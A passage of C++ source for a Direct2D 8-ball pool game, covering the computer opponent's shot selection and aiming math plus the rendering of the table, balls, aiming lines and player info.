    } // End loop through potential target balls

    // If targeting 8-ball and no shot found, or targeting own balls and no shot found,
    // need a safety strategy. Current simple AI just takes best found or taps cue ball.

    return bestShotOverall;
}


// Evaluate a potential shot at a specific target ball towards a specific pocket
AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex) {
    AIShotInfo shotInfo;
    shotInfo.possible = false; // Assume not possible initially
    shotInfo.targetBall = targetBall;
    shotInfo.pocketIndex = pocketIndex;

    Ball* cueBall = GetCueBall();
    if (!cueBall || !targetBall) return shotInfo;

    // --- Define local state variables needed for legality checks ---
    BallType aiAssignedType = player2Info.assignedType;
    bool canTargetAny = (aiAssignedType == BallType::NONE); // Can AI hit any ball?
    bool mustTarget8Ball = (!canTargetAny && aiAssignedType != BallType::NONE && player2Info.ballsPocketedCount >= 7);
    // ---

    // 1. Calculate Ghost Ball position
    shotInfo.ghostBallPos = CalculateGhostBallPos(targetBall, pocketIndex);

    // 2. Calculate Angle from Cue Ball to Ghost Ball
    float dx = shotInfo.ghostBallPos.x - cueBall->x;
    float dy = shotInfo.ghostBallPos.y - cueBall->y;
    if (fabs(dx) < 0.01f && fabs(dy) < 0.01f) return shotInfo; // Avoid aiming at same spot
    shotInfo.angle = atan2f(dy, dx);

    // Basic angle validity check (optional)
    if (!IsValidAIAimAngle(shotInfo.angle)) {
        // Maybe log this or handle edge cases
    }

    // 3. Check Path: Cue Ball -> Ghost Ball Position
    // Use D2D1::Point2F() factory function here
    if (!IsPathClear(D2D1::Point2F(cueBall->x, cueBall->y), shotInfo.ghostBallPos, cueBall->id, targetBall->id)) {
        return shotInfo; // Path blocked
    }

    // 4. Check Path: Target Ball -> Pocket
    // Use D2D1::Point2F() factory function here
    if (!IsPathClear(D2D1::Point2F(targetBall->x, targetBall->y), pocketPositions[pocketIndex], targetBall->id, -1)) {
        return shotInfo; // Path blocked
    }

    // 5. Check First Ball Hit Legality
    float firstHitDistSq = -1.0f;
    // Use D2D1::Point2F() factory function here
    Ball* firstHit = FindFirstHitBall(D2D1::Point2F(cueBall->x, cueBall->y), shotInfo.angle, firstHitDistSq);

    if (!firstHit) {
        return shotInfo; // AI aims but doesn't hit anything? Impossible shot.
    }

    // Check if the first ball hit is the intended target ball
    if (firstHit->id != targetBall->id) {
        // Allow hitting slightly off target if it's very close to ghost ball pos
        float ghostDistSq = GetDistanceSq(shotInfo.ghostBallPos.x, shotInfo.ghostBallPos.y, firstHit->x, firstHit->y);
        // Allow a tolerance roughly half the ball radius squared
        if (ghostDistSq > (BALL_RADIUS * 0.7f) * (BALL_RADIUS * 0.7f)) {
            // First hit is significantly different from the target point.
            // This shot path leads to hitting the wrong ball first.
            return shotInfo; // Foul or unintended shot
        }
        // If first hit is not target, but very close, allow it for now (might still be foul based on type).
    }

    // Check legality of the *first ball actually hit* based on game rules
    if (!canTargetAny) { // Colors are assigned (or should be)
        if (mustTarget8Ball) { // Must hit 8-ball first
            if (firstHit->id != 8) {
                // return shotInfo; // FOUL - Hitting wrong ball when aiming for 8-ball
                // Keep shot possible for now, rely on AIFindBestShot to prioritize legal ones
            }
        }
        else { // Must hit own ball type first
            if (firstHit->type != aiAssignedType && firstHit->id != 8) { // Allow hitting 8-ball if own type blocked? No, standard rules usually require hitting own first.
                // return shotInfo; // FOUL - Hitting opponent ball or 8-ball when shouldn't
                // Keep shot possible for now, rely on AIFindBestShot to prioritize legal ones
            }
            else if (firstHit->id == 8) {
                // return shotInfo; // FOUL - Hitting 8-ball when shouldn't
                // Keep shot possible for now
            }
        }
    }
    // (If canTargetAny is true, hitting any ball except 8 first is legal - assuming not scratching)


    // 6. Calculate Score & Power (Difficulty affects this)
    shotInfo.possible = true; // If we got here, the shot is geometrically possible and likely legal enough for AI to consider

    float cueToGhostDist = GetDistance(cueBall->x, cueBall->y, shotInfo.ghostBallPos.x, shotInfo.ghostBallPos.y);
    float targetToPocketDist = GetDistance(targetBall->x, targetBall->y, pocketPositions[pocketIndex].x, pocketPositions[pocketIndex].y);

    // Simple Score: Shorter shots are better, straighter shots are slightly better.
    float distanceScore = 1000.0f / (1.0f + cueToGhostDist + targetToPocketDist);

    // Angle Score: Calculate cut angle
    // Vector Cue -> Ghost
    float v1x = shotInfo.ghostBallPos.x - cueBall->x;
    float v1y = shotInfo.ghostBallPos.y - cueBall->y;
    // Vector Target -> Pocket
    float v2x = pocketPositions[pocketIndex].x - targetBall->x;
    float v2y = pocketPositions[pocketIndex].y - targetBall->y;
    // Normalize vectors
    float mag1 = sqrtf(v1x * v1x + v1y * v1y);
    float mag2 = sqrtf(v2x * v2x + v2y * v2y);
    float angleScoreFactor = 0.5f; // Default if vectors are zero len
    if (mag1 > 0.1f && mag2 > 0.1f) {
        v1x /= mag1; v1y /= mag1;
        v2x /= mag2; v2y /= mag2;
        // Dot product gives cosine of angle between cue ball path and target ball path
        float dotProduct = v1x * v2x + v1y * v2y;
        // Straighter shot (dot product closer to 1) gets higher score
        angleScoreFactor = (1.0f + dotProduct) / 2.0f; // Map [-1, 1] to [0, 1]
    }
    angleScoreFactor = std::max(0.1f, angleScoreFactor); // Ensure some minimum score factor

    shotInfo.score = distanceScore * angleScoreFactor;

    // Bonus for pocketing 8-ball legally
    if (mustTarget8Ball && targetBall->id == 8) {
        shotInfo.score *= 10.0; // Strongly prefer the winning shot
    }

    // Penalty for difficult cuts? Already partially handled by angleScoreFactor.

    // 7. Calculate Power
    shotInfo.power = CalculateShotPower(cueToGhostDist, targetToPocketDist);

    // 8. Add Inaccuracy based on Difficulty (same as before)
    float angleError = 0.0f;
    float powerErrorFactor = 1.0f;

    switch (aiDifficulty) {
    case EASY:
        angleError = (float)(rand() % 100 - 50) / 1000.0f; // +/- ~3 deg
        powerErrorFactor = 0.8f + (float)(rand() % 40) / 100.0f; // 80-120%
        shotInfo.power *= 0.8f;
        break;
    case MEDIUM:
        angleError = (float)(rand() % 60 - 30) / 1000.0f; // +/- ~1.7 deg
        powerErrorFactor = 0.9f + (float)(rand() % 20) / 100.0f; // 90-110%
        break;
    case HARD:
        angleError = (float)(rand() % 10 - 5) / 1000.0f; // +/- ~0.3 deg
        powerErrorFactor = 0.98f + (float)(rand() % 4) / 100.0f; // 98-102%
        break;
    }
    shotInfo.angle += angleError;
    shotInfo.power *= powerErrorFactor;
    shotInfo.power = std::max(1.0f, std::min(shotInfo.power, MAX_SHOT_POWER)); // Clamp power

    return shotInfo;
}


// Calculates required power (simplified)
float CalculateShotPower(float cueToGhostDist, float targetToPocketDist) {
    // Basic model: Power needed increases with total distance the balls need to travel.
    // Need enough power for cue ball to reach target AND target to reach pocket.
    float totalDist = cueToGhostDist + targetToPocketDist;

    // Map distance to power (needs tuning)
    // Let's say max power is needed for longest possible shot (e.g., corner to corner ~ 1000 units)
    float powerRatio = std::min(1.0f, totalDist / 800.0f); // Normalize based on estimated max distance

    float basePower = MAX_SHOT_POWER * 0.2f; // Minimum power to move balls reliably
    float variablePower = (MAX_SHOT_POWER * 0.8f) * powerRatio; // Scale remaining power range

    // Harder AI could adjust based on desired cue ball travel (more power for draw/follow)
    return std::min(MAX_SHOT_POWER, basePower + variablePower);
}

// Calculate the position the cue ball needs to hit for the target ball to go towards the pocket
D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex) {
    float targetToPocketX = pocketPositions[pocketIndex].x - targetBall->x;
    float targetToPocketY = pocketPositions[pocketIndex].y - targetBall->y;
    float dist = sqrtf(targetToPocketX * targetToPocketX + targetToPocketY * targetToPocketY);

    if (dist < 1.0f) { // Target is basically in the pocket
        // Aim slightly off-center to avoid weird physics? Or directly at center?
        // For simplicity, return a point slightly behind center along the reverse line.
        return D2D1::Point2F(targetBall->x - targetToPocketX * 0.1f, targetBall->y - targetToPocketY * 0.1f);
    }

    // Normalize direction vector from target to pocket
    float nx = targetToPocketX / dist;
    float ny = targetToPocketY / dist;

    // Ghost ball position is diameter distance *behind* the target ball along this line
    float ghostX = targetBall->x - nx * (BALL_RADIUS * 2.0f);
    float ghostY = targetBall->y - ny * (BALL_RADIUS * 2.0f);

    return D2D1::Point2F(ghostX, ghostY);
}

// Checks if line segment is clear of obstructing balls
bool IsPathClear(D2D1_POINT_2F start, D2D1_POINT_2F end, int ignoredBallId1, int ignoredBallId2) {
    float dx = end.x - start.x;
    float dy = end.y - start.y;
    float segmentLenSq = dx * dx + dy * dy;

    if (segmentLenSq < 0.01f) return true; // Start and end are same point

    for (const auto& ball : balls) {
        if (ball.isPocketed) continue;
        if (ball.id == ignoredBallId1) continue;
        if (ball.id == ignoredBallId2) continue;

        // Check distance from ball center to the line segment
        float ballToStartX = ball.x - start.x;
        float ballToStartY = ball.y - start.y;

        // Project ball center onto the line defined by the segment
        float dot = (ballToStartX * dx + ballToStartY * dy) / segmentLenSq;

        D2D1_POINT_2F closestPointOnLine;
        if (dot < 0) { // Closest point is start point
            closestPointOnLine = start;
        }
        else if (dot > 1) { // Closest point is end point
            closestPointOnLine = end;
        }
        else { // Closest point is along the segment
            closestPointOnLine = D2D1::Point2F(start.x + dot * dx, start.y + dot * dy);
        }

        // Check if the closest point is within collision distance (ball radius + path radius)
        if (GetDistanceSq(ball.x, ball.y, closestPointOnLine.x, closestPointOnLine.y) < (BALL_RADIUS * BALL_RADIUS)) {
            // Consider slightly wider path check? Maybe BALL_RADIUS * 1.1f?
            // if (GetDistanceSq(ball.x, ball.y, closestPointOnLine.x, closestPointOnLine.y) < (BALL_RADIUS * 1.1f)*(BALL_RADIUS*1.1f)) {
            return false; // Path is blocked
        }
    }
    return true; // No obstructions found
}

// Finds the first ball hit along a path (simplified)
Ball* FindFirstHitBall(D2D1_POINT_2F start, float angle, float& hitDistSq) {
    Ball* hitBall = nullptr;
    hitDistSq = -1.0f; // Initialize hit distance squared
    float minCollisionDistSq = -1.0f;

    float cosA = cosf(angle);
    float sinA = sinf(angle);

    for (auto& ball : balls) {
        if (ball.isPocketed || ball.id == 0) continue; // Skip cue ball and pocketed

        float dx = ball.x - start.x;
        float dy = ball.y - start.y;

        // Project vector from start->ball onto the aim direction vector
        float dot = dx * cosA + dy * sinA;

        if (dot > 0) { // Ball is generally in front
            // Find closest point on aim line to the ball's center
            float closestPointX = start.x + dot * cosA;
            float closestPointY = start.y + dot * sinA;
            float distSq = GetDistanceSq(ball.x, ball.y, closestPointX, closestPointY);

            // Check if the aim line passes within the ball's radius
            if (distSq < (BALL_RADIUS * BALL_RADIUS)) {
                // Calculate distance from start to the collision point on the ball's circumference
                float backDist = sqrtf(std::max(0.f, BALL_RADIUS * BALL_RADIUS - distSq));
                float collisionDist = dot - backDist; // Distance along aim line to collision

                if (collisionDist > 0) { // Ensure collision is in front
                    float collisionDistSq = collisionDist * collisionDist;
                    if (hitBall == nullptr || collisionDistSq < minCollisionDistSq) {
                        minCollisionDistSq = collisionDistSq;
                        hitBall = &ball; // Found a closer hit ball
                    }
                }
            }
        }
    }
    hitDistSq = minCollisionDistSq; // Return distance squared to the first hit
    return hitBall;
}

// Basic check for reasonable AI aim angles (optional)
bool IsValidAIAimAngle(float angle) {
    // Placeholder - could check for NaN or infinity if calculations go wrong
    return isfinite(angle);
}

// --- Drawing Functions ---

void OnPaint() {
    HRESULT hr = CreateDeviceResources(); // Ensure resources are valid

    if (SUCCEEDED(hr)) {
        pRenderTarget->BeginDraw();
        DrawScene(pRenderTarget); // Pass render target
        hr = pRenderTarget->EndDraw();

        if (hr == D2DERR_RECREATE_TARGET) {
            DiscardDeviceResources();
            // Optionally request another paint message: InvalidateRect(hwndMain, NULL, FALSE);
            // But the timer loop will trigger redraw anyway.
        }
    }
    // If CreateDeviceResources failed, EndDraw might not be called.
    // Consider handling this more robustly if needed.
}

void DrawScene(ID2D1RenderTarget* pRT) {
    if (!pRT) return;

    //pRT->Clear(D2D1::ColorF(D2D1::ColorF::LightGray)); // Background color
    // Set background color to #ffffcd (RGB: 255, 255, 205)
    pRT->Clear(D2D1::ColorF(1.0f, 1.0f, 0.803f)); // Clear with light yellow background

    DrawTable(pRT);
    DrawBalls(pRT);
    DrawAimingAids(pRT); // Includes cue stick if aiming
    DrawUI(pRT);
    DrawPowerMeter(pRT);
    DrawSpinIndicator(pRT);
    DrawPocketedBallsIndicator(pRT);
    DrawBallInHandIndicator(pRT); // Draw cue ball ghost if placing

     // Draw Game Over Message
    if (currentGameState == GAME_OVER && pTextFormat) {
        ID2D1SolidColorBrush* pBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pBrush);
        if (pBrush) {
            D2D1_RECT_F layoutRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP + TABLE_HEIGHT / 2 - 30, TABLE_RIGHT, TABLE_TOP + TABLE_HEIGHT / 2 + 30);
            pRT->DrawText(
                gameOverMessage.c_str(),
                (UINT32)gameOverMessage.length(),
                pTextFormat, // Use large format maybe?
                &layoutRect,
                pBrush
            );
            SafeRelease(&pBrush);
        }
    }

}

void DrawTable(ID2D1RenderTarget* pRT) {
    ID2D1SolidColorBrush* pBrush = nullptr;

    // Draw Table Bed (Green Felt)
    pRT->CreateSolidColorBrush(TABLE_COLOR, &pBrush);
    if (!pBrush) return;
    D2D1_RECT_F tableRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP, TABLE_RIGHT, TABLE_BOTTOM);
    pRT->FillRectangle(&tableRect, pBrush);
    SafeRelease(&pBrush);

    // Draw Cushions (Red Border)
    pRT->CreateSolidColorBrush(CUSHION_COLOR, &pBrush);
    if (!pBrush) return;
    // Top Cushion (split by middle pocket)
    pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
    pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
    // Bottom Cushion (split by middle pocket)
    pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
    pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
    // Left Cushion
    pRT->FillRectangle(D2D1::RectF(TABLE_LEFT - CUSHION_THICKNESS, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_LEFT, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
    // Right Cushion
    pRT->FillRectangle(D2D1::RectF(TABLE_RIGHT, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_RIGHT + CUSHION_THICKNESS, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
    SafeRelease(&pBrush);


    // Draw Pockets (Black Circles)
    pRT->CreateSolidColorBrush(POCKET_COLOR, &pBrush);
    if (!pBrush) return;
    for (int i = 0; i < 6; ++i) {
        D2D1_ELLIPSE ellipse = D2D1::Ellipse(pocketPositions[i], HOLE_VISUAL_RADIUS, HOLE_VISUAL_RADIUS);
        pRT->FillEllipse(&ellipse, pBrush);
    }
    SafeRelease(&pBrush);

    // Draw Headstring Line (White)
    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pBrush);
    if (!pBrush) return;
    pRT->DrawLine(
        D2D1::Point2F(HEADSTRING_X, TABLE_TOP),
        D2D1::Point2F(HEADSTRING_X, TABLE_BOTTOM),
        pBrush,
        1.0f // Line thickness
    );
    SafeRelease(&pBrush);
}


void DrawBalls(ID2D1RenderTarget* pRT) {
    ID2D1SolidColorBrush* pBrush = nullptr;
    ID2D1SolidColorBrush* pStripeBrush = nullptr; // For stripe pattern

    pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBrush); // Placeholder
    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);

    if (!pBrush || !pStripeBrush) {
        SafeRelease(&pBrush);
        SafeRelease(&pStripeBrush);
        return;
    }


    for (size_t i = 0; i < balls.size(); ++i) {
        const Ball& b = balls[i];
        if (!b.isPocketed) {
            D2D1_ELLIPSE ellipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

            // Set main ball color
            pBrush->SetColor(b.color);
            pRT->FillEllipse(&ellipse, pBrush);

            // Draw Stripe if applicable
            if (b.type == BallType::STRIPE) {
                // Draw a white band across the middle (simplified stripe)
                D2D1_RECT_F stripeRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS * 0.4f, b.x + BALL_RADIUS, b.y + BALL_RADIUS * 0.4f);
                // Need to clip this rectangle to the ellipse bounds - complex!
                // Alternative: Draw two colored arcs leaving a white band.
                // Simplest: Draw a white circle inside, slightly smaller.
                D2D1_ELLIPSE innerEllipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS * 0.6f, BALL_RADIUS * 0.6f);
                pRT->FillEllipse(innerEllipse, pStripeBrush); // White center part
                pBrush->SetColor(b.color); // Set back to stripe color
                pRT->FillEllipse(innerEllipse, pBrush); // Fill again, leaving a ring - No, this isn't right.

                // Let's try drawing a thick white line across
                // This doesn't look great. Just drawing solid red for stripes for now.
            }

            // Draw Number (Optional - requires more complex text layout or pre-rendered textures)
            // if (b.id != 0 && pTextFormat) {
            //     std::wstring numStr = std::to_wstring(b.id);
            //     D2D1_RECT_F textRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS, b.x + BALL_RADIUS, b.y + BALL_RADIUS);
            //     ID2D1SolidColorBrush* pNumBrush = nullptr;
            //     D2D1_COLOR_F numCol = (b.type == BallType::SOLID || b.id == 8) ? D2D1::ColorF(D2D1::ColorF::Black) : D2D1::ColorF(D2D1::ColorF::White);
            //     pRT->CreateSolidColorBrush(numCol, &pNumBrush);
            //     // Create a smaller text format...
            //     // pRT->DrawText(numStr.c_str(), numStr.length(), pSmallTextFormat, &textRect, pNumBrush);
            //     SafeRelease(&pNumBrush);
            // }
        }
    }

    SafeRelease(&pBrush);
    SafeRelease(&pStripeBrush);
}


void DrawAimingAids(ID2D1RenderTarget* pRT) {
    // Condition check at start (Unchanged)
    if (currentGameState != PLAYER1_TURN && currentGameState != PLAYER2_TURN &&
        currentGameState != BREAKING && currentGameState != AIMING)
    {
        return;
    }

    Ball* cueBall = GetCueBall();
    if (!cueBall || cueBall->isPocketed) return; // Don't draw if cue ball is gone

    ID2D1SolidColorBrush* pBrush = nullptr;
    ID2D1SolidColorBrush* pGhostBrush = nullptr;
    ID2D1StrokeStyle* pDashedStyle = nullptr;
    ID2D1SolidColorBrush* pCueBrush = nullptr;
    ID2D1SolidColorBrush* pReflectBrush = nullptr; // Brush for reflection line

    // Ensure render target is valid
    if (!pRT) return;

    // Create Brushes and Styles (check for failures)
    HRESULT hr;
    hr = pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
    if FAILED(hr) { SafeRelease(&pBrush); return; }
    hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
    if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); return; }
    hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
    if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); return; }
    // Create reflection brush (e.g., lighter shade or different color)
    hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
    if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); SafeRelease(&pReflectBrush); return; }

    if (pFactory) {
        D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
        strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
        hr = pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
        if FAILED(hr) { pDashedStyle = nullptr; }
    }


    // --- Cue Stick Drawing (Unchanged from previous fix) ---
    const float baseStickLength = 150.0f;
    const float baseStickThickness = 4.0f;
    float stickLength = baseStickLength * 1.4f;
    float stickThickness = baseStickThickness * 1.5f;
    float stickAngle = cueAngle + PI;
    float powerOffset = 0.0f;
    if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
        powerOffset = shotPower * 5.0f;
    }
    D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
    D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
    pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);


    // --- Projection Line Calculation ---
    float cosA = cosf(cueAngle);
    float sinA = sinf(cueAngle);
    float rayLength = TABLE_WIDTH + TABLE_HEIGHT; // Ensure ray is long enough
    D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
    D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);

    // Find the first ball hit by the aiming ray
    Ball* hitBall = nullptr;
    float firstHitDistSq = -1.0f;
    D2D1_POINT_2F ballCollisionPoint = { 0, 0 }; // Point on target ball circumference
    D2D1_POINT_2F ghostBallPosForHit = { 0, 0 }; // Ghost ball pos for the hit ball

    hitBall = FindFirstHitBall(rayStart, cueAngle, firstHitDistSq);
    if (hitBall) {
        // Calculate the point on the target ball's circumference
        float collisionDist = sqrtf(firstHitDistSq);
        ballCollisionPoint = D2D1::Point2F(rayStart.x + cosA * collisionDist, rayStart.y + sinA * collisionDist);
        // Calculate ghost ball position for this specific hit (used for projection consistency)
        ghostBallPosForHit = D2D1::Point2F(hitBall->x - cosA * BALL_RADIUS, hitBall->y - sinA * BALL_RADIUS); // Approx.
    }

    // Find the first rail hit by the aiming ray
    D2D1_POINT_2F railHitPoint = rayEnd; // Default to far end if no rail hit
    float minRailDistSq = rayLength * rayLength;
    int hitRailIndex = -1; // 0:Left, 1:Right, 2:Top, 3:Bottom

    // Define table edge segments for intersection checks
    D2D1_POINT_2F topLeft = D2D1::Point2F(TABLE_LEFT, TABLE_TOP);
    D2D1_POINT_2F topRight = D2D1::Point2F(TABLE_RIGHT, TABLE_TOP);
    D2D1_POINT_2F bottomLeft = D2D1::Point2F(TABLE_LEFT, TABLE_BOTTOM);
    D2D1_POINT_2F bottomRight = D2D1::Point2F(TABLE_RIGHT, TABLE_BOTTOM);

    D2D1_POINT_2F currentIntersection;

    // Check Left Rail
    if (LineSegmentIntersection(rayStart, rayEnd, topLeft, bottomLeft, currentIntersection)) {
        float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
        if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 0; }
    }
    // Check Right Rail
    if (LineSegmentIntersection(rayStart, rayEnd, topRight, bottomRight, currentIntersection)) {
        float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
        if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 1; }
    }
    // Check Top Rail
    if (LineSegmentIntersection(rayStart, rayEnd, topLeft, topRight, currentIntersection)) {
        float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
        if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 2; }
    }
    // Check Bottom Rail
    if (LineSegmentIntersection(rayStart, rayEnd, bottomLeft, bottomRight, currentIntersection)) {
        float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
        if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 3; }
    }


    // --- Determine final aim line end point ---
    D2D1_POINT_2F finalLineEnd = railHitPoint; // Assume rail hit first
    bool aimingAtRail = true;

    if (hitBall && firstHitDistSq < minRailDistSq) {
        // Ball collision is closer than rail collision
        finalLineEnd = ballCollisionPoint; // End line at the point of contact on the ball
        aimingAtRail = false;
    }

    // --- Draw Primary Aiming Line ---
    pRT->DrawLine(rayStart, finalLineEnd, pBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

    // --- Draw Target Circle/Indicator ---
    D2D1_ELLIPSE targetCircle = D2D1::Ellipse(finalLineEnd, BALL_RADIUS / 2.0f, BALL_RADIUS / 2.0f);
    pRT->DrawEllipse(&targetCircle, pBrush, 1.0f);

    // --- Draw Projection/Reflection Lines ---
    if (!aimingAtRail && hitBall) {
        // Aiming at a ball: Draw Ghost Cue Ball and Target Ball Projection
        D2D1_ELLIPSE ghostCue = D2D1::Ellipse(ballCollisionPoint, BALL_RADIUS, BALL_RADIUS); // Ghost ball at contact point
        pRT->DrawEllipse(ghostCue, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

        // Calculate target ball projection based on impact line (cue collision point -> target center)
        float targetProjectionAngle = atan2f(hitBall->y - ballCollisionPoint.y, hitBall->x - ballCollisionPoint.x);
        // Clamp angle calculation if distance is tiny
        if (GetDistanceSq(hitBall->x, hitBall->y, ballCollisionPoint.x, ballCollisionPoint.y) < 1.0f) {
            targetProjectionAngle = cueAngle; // Fallback if overlapping
        }

        D2D1_POINT_2F targetStartPoint = D2D1::Point2F(hitBall->x, hitBall->y);
        D2D1_POINT_2F targetProjectionEnd = D2D1::Point2F(
            hitBall->x + cosf(targetProjectionAngle) * 50.0f, // Projection length 50 units
            hitBall->y + sinf(targetProjectionAngle) * 50.0f
        );
        // Draw solid line for target projection
        pRT->DrawLine(targetStartPoint, targetProjectionEnd, pBrush, 1.0f);

        // -- Cue Ball Path after collision (Optional, requires physics) --
        // Very simplified: Assume cue deflects, angle depends on cut angle.
        // float cutAngle = acosf(cosf(cueAngle - targetProjectionAngle)); // Angle between paths
        // float cueDeflectionAngle = ? // Depends on cutAngle, spin, etc. Hard to predict accurately.
        // D2D1_POINT_2F cueProjectionEnd = ...
        // pRT->DrawLine(ballCollisionPoint, cueProjectionEnd, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

        // --- Accuracy Comment ---
        // Note: The visual accuracy of this projection, especially for cut shots (hitting the ball off-center)
        // or shots with spin, is limited by the simplified physics model. Real pool physics involves
        // collision-induced throw, spin transfer, and cue ball deflection not fully simulated here.
        // The ghost ball method shows the *ideal* line for a center-cue hit without spin.

    }
    else if (aimingAtRail && hitRailIndex != -1) {
        // Aiming at a rail: Draw reflection line
        float reflectAngle = cueAngle;
        // Reflect angle based on which rail was hit
        if (hitRailIndex == 0 || hitRailIndex == 1) { // Left or Right rail
            reflectAngle = PI - cueAngle; // Reflect horizontal component
        }
        else { // Top or Bottom rail
            reflectAngle = -cueAngle; // Reflect vertical component
        }
        // Normalize angle if needed (atan2 usually handles this)
        while (reflectAngle > PI) reflectAngle -= 2 * PI;
        while (reflectAngle <= -PI) reflectAngle += 2 * PI;


        float reflectionLength = 60.0f; // Length of the reflection line
        D2D1_POINT_2F reflectionEnd = D2D1::Point2F(
            finalLineEnd.x + cosf(reflectAngle) * reflectionLength,
            finalLineEnd.y + sinf(reflectAngle) * reflectionLength
        );

        // Draw the reflection line (e.g., using a different color/style)
        pRT->DrawLine(finalLineEnd, reflectionEnd, pReflectBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);
    }

    // Release resources
    SafeRelease(&pBrush);
    SafeRelease(&pGhostBrush);
    SafeRelease(&pCueBrush);
    SafeRelease(&pReflectBrush); // Release new brush
    SafeRelease(&pDashedStyle);
}

void DrawUI(ID2D1RenderTarget* pRT) {
    if (!pTextFormat || !pLargeTextFormat) return;

    ID2D1SolidColorBrush* pBrush = nullptr;
    pRT->CreateSolidColorBrush(UI_TEXT_COLOR, &pBrush);
    if (!pBrush) return;

    // --- Player Info Area (Top Left/Right) --- (Unchanged)
    float uiTop = TABLE_TOP - 80;
    float uiHeight = 60;
    float p1Left = TABLE_LEFT;
    float p1Width = 150;
    float p2Left = TABLE_RIGHT - p1Width;
    D2D1_RECT_F p1Rect = D2D1::RectF(p1Left, uiTop, p1Left + p1Width, uiTop + uiHeight);
    D2D1_RECT_F p2Rect = D2D1::RectF(p2Left, uiTop, p2Left + p1Width, uiTop + uiHeight);

    // Player 1 Info Text (Unchanged)
    std::wostringstream oss1;
    oss1 << player1Info.name.c_str() << L""\n"";
    if (player1Info.assignedType != BallType::NONE) {
        oss1 << ((player1Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
        oss1 << L"" ["" << player1Info.ballsPocketedCount << L""/7]"";
    }
    else {
        oss1 << L""(Undecided)"";
    }
    pRT->DrawText(oss1.str().c_str(), (UINT32)oss1.str().length(), pTextFormat, &p1Rect, pBrush);

    // Player 2 Info Text (Unchanged)
    std::wostringstream oss2;
    oss2 << player2Info.name.c_str() << L""\n"";
    if (player2Info.assignedType != BallType::NONE) {
        oss2 << ((player2Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
